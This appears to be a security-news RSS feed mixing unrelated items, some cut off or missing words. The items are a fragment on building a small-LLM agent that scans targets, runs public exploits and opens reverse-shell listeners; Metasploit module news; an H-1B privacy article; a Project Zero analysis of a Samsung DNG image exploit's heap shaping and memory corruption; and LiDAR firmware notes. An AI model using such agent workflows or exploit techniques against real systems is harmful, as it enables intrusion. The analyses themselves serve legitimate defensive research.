You might be thinking: “Can such a small model really handle this complexity?”Short answer: Yes, surprisingly well.Here’s why Qwen3:1.7b works for this use case:The model doesn’t need to “know” how to hack—it just needs to:Parse structured output (nmap, searchsploit JSON)Follow sequential instructionsReason about dependencies (“I need scan results before searching”)Read and understand basic code patterns2. Constrained Problem SpaceUnlike general chat, we’re operating in a :Clear workflow (scan → search → mirror → inspect → execute)In my testing, Qwen3:1.7b:✅ Successfully chains 5+ tool calls✅ Parses nmap output accurately✅ Identifies service versions✅ Reads and understands Python exploit code✅ Distinguishes reverse vs bind shells❌ Sometimes needs retries for complex exploits❌ May struggle with ambiguous service namesThe Secret Sauce: System PromptingThe system prompt is . Here’s why mine works:STRICTLY FOLLOW THIS ORDER:
1. Scan the target using `scan_target`. WAIT for the results.
2. ANALYZE the scan results...
Small models need . No implicit steps.c. IF it is a **Reverse Shell** (requires local listener):
   - Identify the port it connects back to (LPORT).
   - If hardcoded, use `start_listener` on that port.
I explicitly teach the agent .**WAIT**, **ANALYZE**, **ONLY AFTER**, **DETERMINE**
Emphasis helps small models focus on critical instructions.Do NOT call `search_exploits` until you have received 
the output from `scan_target`.
Anticipate common mistakes and preemptively prevent them.Building this wasn’t smooth sailing. Here are the biggest challenges:: Early versions would try to mirror exploits before searching for them.Challenge 2: JSON Parsing Errors: Searchsploit JSON sometimes has edge cases.Always handle malformed output gracefully.Challenge 3: Reverse vs Bind Shell Detection: Agent struggled to determine if listener needed.Challenge 4: Background Listener Management: Netcat listeners blocking the main process.Challenge 5: Model Context Length: Full exploit code can be 500+ lines.This is just v1.0. Here’s my roadmap:1. Multi-Exploit OrchestrationCurrently handles one exploit at a time. Future version:2. Privilege Escalation Module3. Exploit Success Detection4.

Wanted to add some stuff you might find interesting.With so many people carrying around cameras, we’re getting more videos of giant squid at the surface than in previous decades. We’re also starting to notice a pattern, that around this time of year (peaking in January) we see a bunch of giant squid around Japan. We don’t know why this is happening. Maybe they gather around there to mate or something? who knows! but since so many people have cameras, those one-off monster-story encounters are now caught on video, like this one (which, btw, rips. This squid looks so healthy, it’s awesome).When we see big (giant or colossal) healthy squid like this, it’s often because a fisher caught something else (either another squid or sometimes an antarctic toothfish). The squid is attracted to whatever was caught and they hop on the hook and go along for the ride when the target species is reeled in. There are a few colossal squid sightings similar to this from the southern ocean (but fewer people are down there, so fewer cameras, fewer videos). On the original instagram video, a bunch of people are like “Put it back! Release him!” etc, but he’s just enjoying dinner (obviously as the squid swims away at the end).]]></content:encoded></item><item><title>Exploitation of Critical Vulnerability in React Server Components (Updated December 12)</title><link>https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/</link><author>Unit 42</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/12/02_Vulnerabilities_1920x900.jpg" length="" type=""/><pubDate>Fri, 12 Dec 2025 21:40:55 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[We discuss the CVSS 10.0-rated RCE vulnerability in the Flight protocol used by React Server Components.

The vulnerability, tracked as CVE-2025-55182, carries a CVSS score of 10.0 and is informally known as "React2Shell". It allows attackers to achieve prototype pollution during deserialization of RSC payloads by sending specially crafted multipart requests with "proto", "constructor", or "prototype" as module names. We're happy to announce that community contributor vognik submitted an exploit module for React2Shell which landed earlier this week and is included in this week's release.Over the past couple of weeks Metasploit has made a couple of key improvements to the framework’s MSSQL attack capabilities. The first (PR 20637) is a new NTLM relay module, , which enables users to start a malicious SMB server that will relay authentication attempts to one or more target MSSQL servers. When successful, the Metasploit operator will have an interactive session to the MSSQL server that can be used to run interactive queries, or MSSQL auxiliary modules.Building on this work, it became clear that users would need to interact with MSSQL servers that required encryption as many do in hardened environments. To achieve that objective, issue 18745 was closed by updating Metasploits MSSQL protocol library to offer better encryption support. Now, Metasploit users can open interactive sessions to servers that offer and even require encrypted connections. This functionality is available automatically in the and new modules.Path:Description: This adds a new exploit module for CVE-2025-54236 (SessionReaper), a critical vulnerability in Magento/Adobe Commerce that allows unauthenticated remote code execution.

Starting December 15, skilled workers on H-1B visas and their families must flip their social media profiles to public before their consular interviews. It’s a deeply risky move from a security and privacy perspective.According to a missive from the US State Department, immigration officers use all available information to vet newcomers for signs that they pose a threat to national security. That includes an “online presence review.” That review now requires not just H-1B applicants but also H-4 applicants (their dependents who want to move with them to the US) to “adjust the privacy settings on all of their social media profiles to ‘public.'”An internal State Department cable obtained by CBS had sharper language: it instructs officers to screen for “any indications of hostility toward the citizens, culture, government, institutions, or founding principles of the United States.” What that means is unclear, but if your friends like posting strong political opinions, you should be worried.This isn’t the first time that the government has forced people to lift the curtain on their private digital lives. The US State Department forced student visa applicants to make their social media profiles public in June this year.This is a big deal for a lot of people. The H-1B program allows companies to temporarily hire foreign workers in specialty jobs. The US processed around 400,000 visas under the H-1B program last year, most of which were applications to renew employment, according to the Pew Research Center. When you factor in those workers’ dependents, we’re talking well over a million people. This decision forces them into long-term digital exposure that threatens not just them, but the US too.Why forced public exposure is a security disasterA lot of these H-1B workers work for defense contractors, chip makers, AI labs, and big tech companies. These are organizations that foreign powers (especially those hostile to the US) care a lot about, and that makes those H-1B employees primary targets for them.Making H-1B holders’ real names, faces, and daily routines public is a form of digital doxxing. The policy exposes far more personal information than is safe, creating significant new risks.This information gives these actors a free organizational chart, complete with up-to-date information on who’s likely to be working on chip designs and sensitive software.It also gives the same people all they need to target people on that chart. They have information on H-1B holders and their dependents, including intelligence about their friends and family, their interests, their regular locations, and even what kinds of technology they use. They become more exposed to risks like SIM swapping and swatting.This public information also turns employees into organizational attack vectors. Adversaries can use personal and professional data to enhance spear-phishing and business email compromise techniques that cost organizations dearly. Public social media content becomes training data for fraud, serving up audio and video that threat actors can use to create lifelike impersonations of company employees.Social media profiles also give adversaries an ideal way to approach people. They have a nasty habit of exploiting social media to target assets for recruitment. The head of MI5 warned two years ago that Chinese state actors had approached an estimated 20,000 Britons via LinkedIn to steal industrial or technological secrets.Armed with a deep, intimate understanding of what makes their targets tick, attackers stand a much better chance of co-opting them. One person might need money because of a gambling problem or a sick relative. Another might be lonely and a perfect target for a romance scam.Or how about basic extortion? LGBTQ+ individuals from countries where homosexuality is criminalized risk exposure to regimes that could harm them when they return. Family in hostile countries become bargaining chips. In some regions, families of high-value employees could face increased exposure if this information becomes accessible. Foreign nation states are good at exploiting pain points. This policy means that they won’t have to look far for them.Visa applications might assume they can simply make an account private again once officials have evaluated them. But adversary states to the US are actively seeking such information. They have vast online surveillance operations that scrape public social media accounts. As soon as they notice someone showing up in the US with H-1B visa status, they’ll be ready to mine account data that they’ve already scraped.So what is an H-1B applicant to do? Deleting accounts is a bad idea, because sudden disappearance can trigger suspicion and officers may detect forensic traces. A safer approach is to pause new posting and carefully review older content before making profiles public. Removing or hiding posts that reveal personal routines, locations, or sensitive opinions reduces what can be taken out of context or used for targeting once accounts are exposed.The irony is that spies are likely using fake social media accounts honed for years to slip under the radar. That means they’ll keep operating in the dark while legitimate H-1B applicants are the ones who become vulnerable. So this policy may unintentionally create the very risks it aims to prevent. And it also normalizes mandatory public exposure as a condition of government interaction. We’re at a crossroads. Today, visa applicants, their families, and their employers are at risk. The infrastructure exists to expand this approach in the future. Or officials could stop now and rethink, before these risks become more deeply entrenched.We don’t just report on threats – we help protect your social media]]></content:encoded></item><item><title>A look at an Android ITW DNG exploit</title><link>https://googleprojectzero.blogspot.com/2025/12/a-look-at-android-itw-dng-exploit.html</link><author>Google Project Zero</author><category>vulns</category><pubDate>Fri, 12 Dec 2025 18:01:55 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[Posted by Benoît Sevens, Google Threat Intelligence Group

Introduction

Between July 2024 and February 2025, 6 suspicious image files were uploaded to VirusTotal. Thanks to a lead from Meta, these samples came to the attention of Google Threat Intelligence Group.

Investigation of these images showed that these images were DNG files targeting the Quram library, an image parsing library specific to Samsung devices.

On November 7, 2025 Unit 42 released a blogpost describing how these exploits were used and the spyware they dropped. In this blogpost, we would like to focus on the technical details about how the exploits worked. The exploited Samsung vulnerability was fixed in April 2025.

There has been excellent prior work describing image-based exploits targeting iOS, such as Project Zero’s writeup on FORCEDENTRY. Similar in-the-wild “one-shot” image-based exploits targeting Android have received less public documentation, but we would definitely not argue it is because of their lack of existence. Therefore we believe it is an interesting case study to publicly document the technical details of such an exploit on Android.

# Attack vector

The VirusTotal submission filenames of several of these exploits indicated that these images were received over WhatsApp:

IMG-20240723-WA0000.jpg

IMG-20240723-WA0001.jpg

IMG-20250120-WA0005.jpg

WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg

The first filenames listed follow the naming scheme of WhatsApp on Android. The last filename is how WhatsApp Web names image downloads.

The first two images were received on the same day, based on the filename, potentially by the same target. Later analysis showed that the first image targets the jemalloc allocator, while the second one targets the scudo allocator, used on more recent Android versions. This blogpost will detail the scudo version of the exploit as this allocator is more hardened and relevant for recent devices. The concepts and techniques used in the jemalloc version are similar.

The final payload (as we’ll see later) indicates that the exploit expects to run within the com.samsung.ipservice process. How are WhatsApp and com.samsung.ipservice related and what is this process?

The com.samsung.ipservice process is a Samsung-specific system service responsible for providing "intelligent" or AI-powered features to other Samsung applications. It will periodically scan and parse images and videos in Android’s MediaStore.

When WhatsApp receives and downloads an image, it will insert it in the MediaStore. This means that downloaded WhatsApp images (and videos) can hit image parsing attack surface within the com.samsung.ipservice application.

However, WhatsApp does not intend to automatically download images from untrusted contacts. (WhatsApp on Android’s logic is a bit more nuanced though. More details can be found in Brendon Tiszka’s report of a different issue). This means that without additional bypasses and assuming the image is sent by an untrusted contact, a target would have to click the image to trigger the download and have it added to the MediaStore. This would mean this is in fact a “1-click” exploit. We don’t have any knowledge or evidence of the attacker using such a bypass though.

# A curious image

Before we delve into the exploit, let’s gather an understanding of what type of file we are looking at.

$ file "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"

...

(We truncated the “Opcode List” lines, since they contained thousands of opcodes in the actual exiftool output.)

Although the image was saved with a jpeg extension, this image is in fact a Digital Negative (DNG) image. According to Wikipedia:

Digital Negative (DNG) is an open source, lossless, well defined camera RAW data container with the goal to replace a range of proprietary, closed source raw image containers. It has been developed by Adobe.

…

DNG is based on the TIFF/EP standard format, and mandates significant use of metadata. The specification of the file format is open and not subject to any intellectual property restrictions or patents.

The image width and height look suspiciously small. And what are these opcode lists?

# Some DNG format basics

The DNG format specification can be found on Adobe’s website.

DNG files use SubIFD trees, as described in the TIFF-EP specification, in order to contain multiple versions of the same image, such as a preview and a main image. This DNG file has 3 SubIFDs:

- Type “Preview Image” with width 1 and length 1

- Type “Main Image” with width 16 and length 16

- Type “Main Image” with width 1 and length 1


As we mentioned already briefly, the sizes of these images are obviously very suspicious, as well as the fact that there are 2 “Main Image” types. We have not figured out what the purpose of the second main image is (if any).

DNG images can contain 3 “opcode lists”. As it will turn out, these “opcodes” will be very important in the context of this exploit. Their goal is to offload some processing steps from the camera to the DNG reader. Their intended use case is for example to perform lens corrections. The reason there are 3 opcode lists is because they are intended to be applied at different moments during the DNG decoding:

1. The raw image bytes are read from the DNG file, a.k.a. the “stage 1” image

2. Opcode list 1 specifies the list of opcodes that should be applied to the stage 1 image

3. The DNG decoder maps the raw image bytes to linear reference values, which results in a “stage 2” image.

4. Opcode list 2 specifies the list of opcodes that should be applied to the stage 2 image

5. The DNG decoder performs demosaicing of the linear reference values, which results in a “stage 3” image.

6. Opcode list 3 specifies the list of opcodes that should be applied to the stage 3 image.


Every opcode has an opcode ID and varying number and type of parameters. The latest specification (1.7.1.0 from September 2023), contains 14 distinct opcodes, with opcode IDs going from 1 to 14. Below is an example of opcode description found in the specification:

For this exploit, only 3 opcodes will be of interest:

- TrimBounds (opcode ID 6): This opcode trims the image to a specified rectangle.

- MapTable (opcode ID 7): This opcode maps a specified area and plane range of an image through a 16-bit lookup table.

- DeltaPerColumn (opcode ID 11): This opcode applies a per-column delta (constant offset) to a specified area and plane range of an image.


DeltaPerColumn and MapTable perform transformations on areas (defined by a top, left, bottom and right parameter) and plane ranges (defined by a first plane and number of planes parameter).

Looking at the opcode lists in the exiftool output above, we already notice some suspicious things:

- They use opcodes with opcode ID 23 (which exiftool can not map to an opcode name).

- Typical benign DNG images will contain only a handful of opcodes, while for this image we have thousands of opcodes in the opcode lists.


# Quram

As we mentioned before, the targeted process based on the payload is the Samsung firmware specific com.samsung.ipservice. The next question then becomes what code in this application performs the DNG decoding.

Looking at a decompiled com.samsung.ipservice APK (which on our test phone was located at /system/priv-app/IPService/IPService.apk), we can see that when the application parses a file with an extension of "jpg", "jpeg", "JPG" or "JPEG", it will call into the Java method com.quramsoft.images.QrBitmapFactory.decodeFile (bundled in the same APK).

public class com.quramsoft.images.QrBitmapFactory {

public static Bitmap decodeFile(String str, Options options) {

Bitmap decodeFile = QuramBitmapFactory.decodeFile(str, options); // \[1\]; calls into Java\_com\_quramsoft\_images\_QuramBitmapFactory\_nativeDecodeFile2

// Fails

if ((options.inJustDecodeBounds && (options.outWidth > 0 \|\| options.outHeight > 0)) \|\| decodeFile != null) {

return decodeFile;

}

try {

Bitmap decodeFile2 = QuramDngBitmap.decodeFile(str, options); // \[2\]; calls into Java\_com\_quramsoft\_images\_QuramDngBitmap\_DecodeDNGImageBufferJNI

if (options.outWidth <= 0) {

if (options.outHeight <= 0) {

return decodeFile2;

}

}

options.outMimeType = "image/dng";

return decodeFile2;

} catch (IOException e2) {

e2.printStackTrace();

return null;

}

}

The "Quram library" is a set of proprietary, closed-source software libraries used by Samsung on its Android devices. Its primary function is to process, parse, and decode various image formats. The library is not developed by Samsung itself. It is created by a third-party software vendor named Quramsoft. Mateusz Jurczyk already wrote about this library in 2020.

The QrBitmapFactory.decodeFile method will first try to decode the image using QuramBitmapFactory.decodeFile (see \[1\]), which calls the exported Java\_com\_quramsoft\_images\_QuramBitmapFactory\_nativeDecodeFile2 function of the native library libimagecodec.quram.so. This function handles formats such as PNG, JPEG and GIF, but not DNG. This native library is not part of the IPService APK but rather located at /system/lib64/libimagecodec.quram.so.

When QuramBitmapFactory.decodeFile fails, QrBitmapFactory.decodeFile calls QuramDngBitmap.decodeFile as a fallback (see \[2\]), which then calls Java\_com\_quramsoft\_images\_QuramDngBitmap\_DecodeDNGImageBufferJNI. This function will perform the complete DNG decoding and it is within this code path the vulnerability is triggered and the exploit fully executes.

The call sequence is summarized below:

com.quramsoft.images.QrBitmapFactory.decodeFile (com.samsung.ipservice.apk)

\|\_ com.quramsoft.images.QuramBitmapFactory.decodeFile (com.samsung.ipservice.apk)

# Analysis setup

A few tools came in handy when analysing this exploit, which we’ll describe next.

First of all, on the static analysis side, we need an overview of the different opcodes that are called with their parameters. exiftool only gives us a list of the (translated) opcode IDs. To inspect every opcode with its parameters, we can use the dng\_validate tool provided by Adobe’s DNG SDK with the -v flag. It will parse the opcode lists and we can post-process its textual output to make sense of the thousands of opcodes. Here is a snippet of what the output looks like, showing us the different parameters of a few TrimBounds and DeltaPerColumn opcodes.

...

Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

...

On the dynamic analysis side, debugging com.samsung.ipservice would be very annoying, since it only runs periodically (although there are tricks to force start it). For easier debugging, we reused @flankerhqd’s fuzzing harness (in part based on Project Zero’s SkCodecFuzzer), which loads a DNG file provided as a filename into a buffer and passes it to libimagecodec.quram.so’s QrDecodeDNGPreview. We compile it as a standalone binary and can run it under a debugger.

It is noteworthy that QrDecodeDNGPreview (used in our harness) is not the export called by com.samsung.ipservice (which ends up calling QuramDngDecoder::decode). However, if there is no preview image available with one of the JPEG compression types, QrDecodeDNGPreview will call QuramDngDecoder::decodePreview, which will also perform a full DNG decoding and successfully triggers the vulnerability and exploit.

Our test phone was a Samsung Galaxy S21 5G (SM-G991B) running firmware version G991BXXSAFXCL, which has a security patch level of 2024-04-01.

1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1

1 Opcode: ScalePerColumn, minVersion = 1.4.0.0, flags = 1

The specification mentions that if the flag bit is set (which it is), opcodes with unknown opcode IDs should be skipped. So let’s for the moment ignore the “Unknown” opcodes with ID 23 (more on them later).

Let’s look at the first 2 known opcodes, which occur in opcode list 3:

$ grep -A8 TrimBounds dng\_validate.out \| head -n 8

Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1

Bounds: t=0, l=0, b=1, r=1

Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1

AreaSpec: t=0, l=0, b=1, r=1, p=5125:5123, rp=1, cp=1

Count: 1

Delta \[0\] = 26214.000000

The DNG opcode parameters are embedded directly in the file. DeltaPerColumn takes a list of deltas to be applied to each pixel and the "Area Spec" to work over: top, left, right, bottom coordinates, the plane and total number of planes being targeted, and the length of each row and column (rowPitch and colPitch). These values are controllable by the attacker.

The “first plane” (5125) and “number of planes” (5123) parameters of the DeltaPerColumn opcode are very suspicious. At stage 3 in the DNG decoding, the number of planes will be 3 (R, G and B), as can be seen in the CFA related data of the exiftool output. The first value (5125) is the first plane to apply the DeltaPerColumn to, while the second value (5123) is the number of planes. Since the planes are numbered 0 to 2, these values are clearly out of bounds.

Let’s have a look at QuramDngOpcodeDeltaPerColumn::processArea, which is the handler for the DeltaPerColumn opcode. Below are the relevant lines of that function for the vulnerability. (Variable names are chosen by us since this is a closed source library)

\_\_int64 \_\_fastcall QuramDngOpcodeDeltaPerColumn::processArea(

QuramDngOpcode \*opcode,

QuramDngDecoder \*decoder,

QuramDngImage \*image,

QuramDngRect \*rect)

{

...

image\_buffer = image->buffer;

...

image\_number\_of\_planes = image\_buffer->planes; // 3

opcode\_first\_plane = opcode->plane; // 5125

....

opcode\_number\_of\_planes = opcode->planes; // 5123

opcode\_last\_plane = image\_number\_of\_planes + opcode\_number\_of\_planes; // 3 + 5123 = 5126

...

if (opcode\_first\_plane < opcode\_last\_plane ) // 5125 < 5126

{

...

current\_plane = opcode\_first\_plane; // 5125

...

do

{

... // Add delta to the value in the raw pixel buffer at offset corresponding to plane \`current\_plane\`, i.e. 5125!

current\_plane++;

}

while ( current\_plane != opcode\_last\_plane ); // 5125 != 5126

...

}

The function takes a few objects with Quram specific structure as arguments. The QuramDngImage describes the image on which the opcode is to be applied (which is the stage 3 image at this point). The QuramDngOpcode contains the DeltaPerColumn parameters. The function has a triple nested loop to iterate over the width, length and planes of the area. For every such triplet (width,length,plane) it calculates the offset in the raw pixel buffer and adds a delta to it. Only the plane loop is relevant for the bug and displayed in the code above.

Below is an example of a 6x6 image with its different color planes and to what offsets the pixel values map in the raw pixel buffer. During stage 2 and stage 3 image processing, each pixel value in each color plane takes 16 bits.

There are two issues in that handler function:

- opcode\_last\_plane is calculated incorrectly. It should be opcode\_first\_plane + opcode\_number\_of\_planes (as will be the case in the patched version). This by itself is a correctness issue (and a pretty basic one that would be expected to surface by normal usage or testing of the library).

- The plane used in the offset calculation is bounded by opcode\_last\_plane, but at no point is it checked that opcode\_last\_plane is within the number of planes that the image contains.


The actual values from the exploit are annotated as comments in the code snippet. With these values, the plane loop will be executed exactly once. The width and length loop will also be executed only once, since t=0, l=0, b=1, r=1. This means exactly one write will happen. Since the stage 3 image in the exploit has a width 1 and length 1, the write will happen at offset 5125 x 2 = 10250 from the raw pixel buffer.

Not only the offset of the write is controlled, the value to be added to the current value in the raw pixel buffer is also fully controlled, since it is an opcode parameter. In this case it is 26214.0 (or 0x6666). This vulnerability gives thus a very strong primitive from the start: the attacker can add chosen values at chosen offsets with respect to the raw pixel buffer.

Now why do we need that TrimBounds opcode before triggering the bug? That will become clear when we discuss the heap shaping strategy.

# Exploit flow

## Heap shaping strategy

Since the buffers containing the pixel values are dynamically allocated on the heap, it is important to understand what heap allocations the Quram library makes and how these allocations behave to understand the heap layout at the time of the vulnerability triggering.

As we mentioned earlier, exploits exist for Android versions using both jemalloc and scudo allocator. We will analyse the exploit targeting the scudo allocator, since this is the common allocator on modern Android versions. The same techniques were used in a different way in the jemalloc exploit.

### Scudo

We will not give a detailed overview of Android’s scudo allocator, which is being used here for the allocations, since excellent documentation by Synacktiv already exists, to which we refer. We will only mention the elements that are important for this exploit.

Scudo allocates objects in different heap regions depending on the allocation size. For two objects of different types to land near each other, they need to belong to the same size class. The size required from the allocator’s point of view for a “block” is composed of:

- A header of 0x10 bytes

- The chunk with the user requested size. A pointer to the chunk is returned to the caller.


New allocations are retrieved via “transfer batches”. The number of allocations in a transfer batch depends on the size class. For the size we will be interested in (chunks of 0x30 bytes, i.e. blocks of 0x40 bytes), there are 52 allocations in a transfer batch. The allocations within a transfer batch are returned in a randomized order, however subsequent transfer batches are just laid out linearly in memory. A consequence of this is that given enough allocations between two allocations of the same size, an attacker can be confident that the last allocation falls after the first allocation.

Lastly, scudo supports a quarantine mechanism that prevents freed allocations to be returned immediately on a next allocation request. However on Android this quarantine mechanism is disabled. The consequence is that a freed object will be directly reallocated on the next allocation request of the same size.

### Quram’s heap allocations

With a basic understanding of scudo’s allocation behaviour, let’s look at the specific heap allocations Quram makes when decoding a DNG file.

First, when Quram parses the opcode lists in the DNG file, it will allocate one QuramDngOpcode object per opcode. These objects contain the parameters of the opcode, as well as a vtable pointer to the handlers for that opcode. The size of such an object depends thus on the number and type of parameters and hence on the type of opcode. The size of the different opcodes can be looked up in QuramDngDecoder::makeDngOpcode. For the exploit at hand, only the following opcode sizes are relevant:

- DeltaPerColumn (opcode ID 11): 0x50 bytes
- MapTable (opcode ID 7): 0x50 bytes
- TrimBounds (opcode ID 6): 0x30 bytes
- Unknown (starting at opcode ID 14, such as opcode ID 23 in the exploit): 0x30 bytes

This means TrimBounds and Unknown opcodes will land in the same heap region, distinct from the heap region containing the DeltaPerColumn and MapTable opcodes.

Next, for every stage image, Quram will allocate three heap buffers:

- A QuramDngImage of fixed size 0x30, which describes the image

- A buffer for the pixel values of variable size (depending on width, height and number of planes)

- A QuramDngPixelBuffer of fixed size 0x40, which describes the contents of the buffer


These different objects and their relationship are illustrated below:

There are two “pixel buffers” at play here, which can be a bit confusing: the QuramDngPixelBuffer object and the raw buffer with pixel values. In what comes, when we talk about “raw pixel buffer”, we refer to the latter.

QuramDngImage and QuramDngPixelBuffer will land in different heap regions since they belong to different scudo allocation class sizes. The raw pixel buffer may end up in the same heap region as a QuramDngImage depending on its size. Its size is calculated by ComputeBufferSize. For the dimensions of the stage 3 image of the exploit (width 1 by length 1 with 3 color planes) it will calculate a size of 0x30 bytes (even though 6 bytes would suffice). For the stage 1 and stage 2 images, the sizes are different and will be allocated in a different heap region.

To conclude, both the TrimBounds opcodes, the Unknown opcodes, the QuramDngImage objects as well as potentially the raw pixel buffer will end up in the same heap region.

### Final heap layout

We can now study the sequence of events during DNG decoding to understand the heap layout at the time of the vulnerability trigger:

- QuramDngDecoder::getRegionStage1Image will allocate a “stage 1” QuramDngImage (size 0x30)

- QuramDngDecoder::readStage1Image parses the 3 opcode lists and allocates a QuramDngOpcode structure per opcode. As we saw, only TrimBounds and Unknown opcodes will land in the same heap region of 0x30 bytes chunks, which is of interest to us. Other opcodes are allocated in different heap regions.


$ grep -E 'OpcodeList\|TrimBounds\|Unknown' dng\_validate.out \| uniq -c

1 OpcodeList1: count = 320004, offset = 814

1 OpcodeList2: count = 3844, offset = 320818

20000 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

1040 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1

- QuramDngDecoder::buildStage2Image will apply opcode list 1. When it is done, the 20000 unknown opcodes it contains are freed.

- QuramDngDecoder::doBuildStage2 will allocate a QuramDngImage “stage 2” (size 0x30) and convert stage 1 to stage 2. This stage 2 image will take the spot of the last opcode of opcode list 1 that was freed.

- QuramDngDecoder::buildStage2Image can now free the “stage 1” QuramDngImage. It will then process the opcode list 2, and free the 240 “unknown” opcodes.

- QuramDngDecoder::doInterpolateStage3 will allocate both a new “stage 3” QuramDngImage (size 0x30) and subsequently a raw pixel buffer of size 0x30. These will take the spots of the last 2 opcodes freed from opcode list 2 in the previous step.

- QuramDngDecoder::buildStage3Image can now free the “stage 2” QuramDngImage.

- Opcode list 3 gets processed now. In the first TrimBounds opcode, QuramDngOpcodeTrimBounds::doApply will allocate a new raw pixel buffer of size 0x30 (although the replaced raw pixel buffer has the exact same size). This allocation will take the spot of the freed stage 2 image.

- Note that the 640 other TrimBounds opcodes have a “minVersion” of 1.4.0.1. This is a trick that will make QuramDngOpcode::aboutToApply bail out early and not have the TrimBounds actually executed. The goal of spraying these 640 TrimBounds opcodes will become clear later.


The eventual heap layout for chunks of size 0x30 is illustrated below. The annotated offsets will be important later on.

Note that because of scudo’s randomization strategy, the allocations of different opcode lists will actually overlap slightly (on the order of 52 allocations), but given enough allocations this effect can be neglected.

Because the allocations have chunk sizes of 0x30 bytes, they take up 0x40 bytes on the heap. Different chunks in this heap region are thus spaced by multiples of 0x40 bytes, which will help us in quickly inferring what parts of an object are being corrupted. The illustration also depicts the sizes the allocations occupy in total, which will be important for understanding the subsequent exploitation flow.

As we’ll see, the exploit will write out of bounds from the raw pixel buffer of stage 3 into the QuramDngImage of stage 3. This explains why the attackers first used a TrimBounds opcode before triggering the bug: it assures that the raw pixel buffer will end up before the QuramDngImage. Without it, there would be a one out of two chance that the raw pixel buffer takes a spot after the QuramDngImage.

## The initial corruption

After achieving the right heap layout using the TrimBounds, 480 DeltaPerColumn opcodes follow. As a reminder, these are allocated in a different heap region because of a different allocation size. As discussed, DeltaPerColumn opcodes are able to add arbitrary values to arbitrary offsets out of bounds. The attackers add 0x6666 to offsets 10 and 12 within 240 heap objects, starting at offset 0x2800 from the raw pixel buffer and ending at offset 0x6400.

Looking at our heap layout, we will corrupt three types of objects at these offsets:

- Unknown and TrimBounds opcodes: opcode structures contain the opcode ID at offset 8 and the specification version at offset 12. Since the opcode IDs will be corrupted, these TrimBounds and Unknown opcodes will simply be skipped later on (which was already the case for the Unknown opcodes).

0xb400007e3e3fa070: 0x0000000000000000 0x0000000000000000

- Most importantly, it will encounter the QuramDngImage object. The two corrupted fields of this object are the “bottom” and “right” fields of the image, which are used in other opcode handlers for verifying if operations are within bounds. This means that we can now use other opcodes, such as MapTable, to perform actions out of bounds.


Before:

0xb400007e3e3fb810: 0x0000000000000000 0x0000000100000001

0xb400007e3e3fb820: 0x0000000300000003 0xb400007f1e2d7ad0

0xb400007e3e3fb830: 0xb400007e3e3f7850 0x0000000000000030

If we look for example at the first MapTable that follows, it looks like:

Opcode: MapTable, minVersion = 1.4.0.0, flags = 1

AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1

Count: 65536

Under regular circumstances, the “left” and “right” value would be out of bounds and this opcode would not perform any operation. Because we corrupted the dimensions of the QuramDngImage though, this opcode will operate out of bounds.

## Extending the primitives

Incrementing arbitrary out of bound values with chosen values is a powerful primitive, but the exploit will also want to write absolute arbitrary values out of bounds. The former can be converted pretty easily into the latter though.

If we have a primitive to write zeros out of bounds, we can combine that with the increment primitive to write arbitrary values in two steps: zero the memory and then increment it with the value we want to write.

Zeroing memory can be done in two ways, and both are used in the exploit:

- Using the MapTable opcode with a substitution table of all zeros

- Using the DeltaPerColumn opcode. The “Delta” parameter is a float, and -Infinity is supported, which sets the resulting value to 0.


In the exploit, MapTable is only used to zero large regions, likely because of the large space overhead of the MapTable opcode (as it requires a substitution table of 65536 values to be included).

## Crafting a bogus MapTable opcode

With linear out-of-bounds write primitive in place, the exploit could now:

- Write a shell command somewhere out of bounds

- Write a JOP gadget chain somewhere out of bounds which ends up calling system()

- Overwrite the vtable pointer of one of the opcode objects to be executed to kick off the JOP chain, resulting in a system(]]></content:encoded></item><item><title>A look at an Android ITW DNG exploit</title><link>https://googleprojectzero.blogspot.com/2025/12/a-look-at-android-itw-dng-exploit.html</link><author>Google Project Zero</author><category>research</category><pubDate>Fri, 12 Dec 2025 18:01:00 +0000</pubDate><source url="https://projectzero.google/">Google Project Zero</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Designing a Passive LiDAR Detector Device - Firmware</title><link>https://www.atredis.com/blog/2025/12/1/designing-a-passive-lidar-detector-device-firmware</link><author>Sam</author><category>vulns</category><pubDate>Fri, 12 Dec 2025 17:48:49 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# Designing a Passive LiDAR Detector Device - Firmware

# Welcome back!

In the last post I described the process of examining the iPhone Pro TrueDepth LiDAR and developing concepts for hardware to detect it. Here I will describe the firmware for this device, the concepts employed in it, and the approaches taken to implementing these concepts on the tiny SAMD21.

Let’s start by revisiting a key point from the previous post:

> “LiDAR is a Flashy Light, How Do We Measure a Flashy Light”

1. **See a signal as light spread into beams over an area**
2. **Sense and convert those beams into analog signals**
3. **Convert the signals from analog to digital**
4. **Measure them**

As it turns out, it is not just detecting _a flashy light_, its detecting _multiple discrete beams of flashy light_ **and differentiating them from other noise**. The hardware described in the last post provides super fast digital signals from 4 discrete photodiodes. We can use those signals to perform several different measurements to differentiate the characteristics of the iPhone Pro TrueDepth LiDAR from other signal sources or noise. The firmware I designed for the device employs the following measurements:

- **Frequency (Goertzel):**
  - Target 60hz and optionally harmonics at 30hz and 120hz

  - _Note that including harmonics increases susceptibility to false positives_
- **Pulse Repetition Frequency (PRF):**
  - We expect the LiDAR signal to appear steady when present, with uniform edges, while things like IR Remotes are more often in bursts
- **Burstlikeness (Interquartile Range of Magnitude):**
  - Again, we expect the signal to appear steady when present, so an analysis of the recent measurements is performed to judge whether they represent a steady or burstlike signal

  - Comparing the top and bottom quartiles of Hann Window Smoothed, detrended signal energy

  - I do not really understand this very well, but I web searched and StackExchanged my way through it.
- **Spatial Coincidence (Discrete Beams versus Wide Flood):**
